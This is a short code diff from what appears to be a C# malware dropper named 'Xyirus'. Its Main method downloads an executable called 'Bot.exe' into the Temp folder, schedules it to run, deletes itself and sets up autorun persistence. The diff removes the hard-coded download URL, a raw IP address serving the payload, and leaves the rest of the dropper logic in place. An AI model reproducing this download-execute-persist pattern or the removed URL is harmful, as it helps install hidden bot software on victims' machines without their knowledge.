@@ -12,7 +12,7 @@ namespace Xyirus
     {
         static void Main(string[] args)
         {
-            Skacat("http://62.113.117.136/bin/Bot.exe", "Bot.exe");
+            Skacat("", "Bot.exe");
             schedule(Environment.GetEnvironmentVariable("Temp") + "\\Bot.exe");
             SelfDelete("5");
             autoRun();
